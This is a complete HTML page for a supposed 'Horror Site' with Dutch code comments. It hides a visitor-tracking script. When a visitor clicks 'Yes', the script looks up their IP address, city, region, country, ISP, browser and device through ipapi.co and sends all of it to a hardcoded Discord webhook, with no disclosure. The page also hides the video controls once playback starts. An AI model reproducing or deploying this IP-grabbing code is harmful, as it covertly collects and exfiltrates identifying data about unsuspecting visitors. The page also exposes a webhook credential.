<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome to the Horror Site</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
    <style>
        /* Jouw CSS-stijlen hier */
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            text-align: center;
        }
        h1 {
            font-size: 3em;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.2em;
            line-height: 1.6;
            margin-bottom: 30px;
        }
        .container {
            display: none; /* Verberg container standaard */
            max-width: 600px;
            padding: 0 20px;
        }
        .horror-img {
            width: 100%;
            max-width: 400px;
            margin-bottom: 30px;
            border: 2px solid #fff;
            border-radius: 10px;
        }
        .btn {
            display: inline-block;
            padding: 10px 20px;
            background-color: #ff0000;
            color: #fff;
            text-decoration: none;
            border-radius: 5px;
            transition: background-color 0.3s ease;
        }
        .btn:hover {
            background-color: #a50000;
        }
        .typed-effect {
            display: inline-block;
        }
    </style>
</head>
<body>
    <!-- Begroeting met horror en getypt effect -->
    <div id="horrorText"></div>

    <!-- Verberg de container totdat de begroeting is voltooid -->
    <div id="container" class="container">
        <img src="horror_image.jpg" alt="Horror Image" class="horror-img">
        <h1>Welcome to the Horror Site</h1>
        <p>Are you brave enough to explore the dark corners of this website?</p>
        <button id="enterBtn" class="btn">Enter if you dare</button>
    </div>

    <!-- Bevestigingsscherm -->
    <div id="confirmation" style="display: none;">
        <h1>Are you sure?</h1>
        <button id="yesBtn" class="btn">Yes</button>
        <button id="noBtn" class="btn">No</button>
    </div>

    <!-- Videospeler -->
    <div id="video-container" style="display: none;">
        <video id="video" width="640" height="360" controls autoplay loop>
            <source src="vid.mp4" type="video/mp4">
            Your browser does not support the video tag.
        </video>
    </div>

    <audio autoplay loop>
        <source src="music.mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>

    <script>
        // Functie om de getypte tekst te simuleren
        function simulateTyping(element, text, speed, callback) {
            var index = 0;
            var timer = setInterval(function() {
                element.textContent += text[index];
                index++;
                if (index === text.length) {
                    clearInterval(timer);
                    if (typeof callback === 'function') {
                        callback();
                    }
                }
            }, speed);
        }

        // Functie om IP-gegevens op te halen en naar Discord Webhook te sturen
        function getIPDataAndSendToDiscord() {
            fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const embedData = {
                    "embeds": [{
                        "title": "IP Address Information",
                        "fields": [
                            {"name": "IP Address", "value": data.ip},
                            {"name": "City", "value": data.city},
                            {"name": "Region", "value": data.region},
                            {"name": "Country", "value": data.country_name},
                            {"name": "Country Code", "value": data.country},
                            {"name": "Continent Code", "value": data.continent_code},
                            {"name": "Timezone", "value": data.timezone},
                            {"name": "Currency", "value": data.currency},
                            {"name": "Language", "value": data.languages},
                            {"name": "Organization", "value": data.org},
                            {"name": "Operating System", "value": navigator.platform},
                            {"name": "Browser", "value": navigator.userAgent},
                            {"name": "Device Type", "value": getDeviceType()},
                            {"name": "User Agent", "value": navigator.userAgent},
                            {"name": "Timestamp", "value": new Date().toLocaleString()}
                        ]
                    }]
                };

                // Log de embed data
                console.log("Embed Data:", embedData);

                fetch('https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(embedData)
                })
                .then(response => console.log(response))
                .catch(error => console.error('Error sending data to Discord:', error));
            })
            .catch(error => console.error('Error fetching IP data:', error));
        }

        // Functie om het apparaattype op te halen
        function getDeviceType() {
            if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
                return 'Mobile';
            } else {
                return 'Desktop';
            }
        }

        // Roep de functie op wanneer de pagina wordt geladen
        window.onload = function() {
            // Horror begroeting met getypt effect
            var horrorText = document.getElementById('horrorText');
            var message = 'Welcome ' + navigator.userAgent + '...';
            simulateTyping(horrorText, message, 50, function() {
                document.getElementById('container').style.display = 'block'; // Laat de container zien na de begroeting
            });

            // Voeg een click event toe aan de "Enter if you dare" knop
            document.getElementById('enterBtn').addEventListener('click', function() {
                document.getElementById('confirmation').style.display = 'block'; // Toon bevestigingsscherm na klikken
            });

            // Voeg click events toe aan de "Yes" en "No" knoppen
            document.getElementById('yesBtn').addEventListener('click', function() {
                getIPDataAndSendToDiscord(); // Log IP-gegevens naar Discord
                document.getElementById('confirmation').style.display = 'none'; // Verberg bevestigingsscherm
                document.getElementById('video-container').style.display = 'block'; // Laat de videospeler zien
            });

            document.getElementById('noBtn').addEventListener('click', function() {
                document.getElementById('confirmation').style.display = 'none'; // Verberg bevestigingsscherm
            });

            // Voorkom dat de video kan worden gepauzeerd of bediend
            document.getElementById('video').addEventListener('play', function() {
                this.controls = false;
            });
        };
    </script>
</body>
</html>
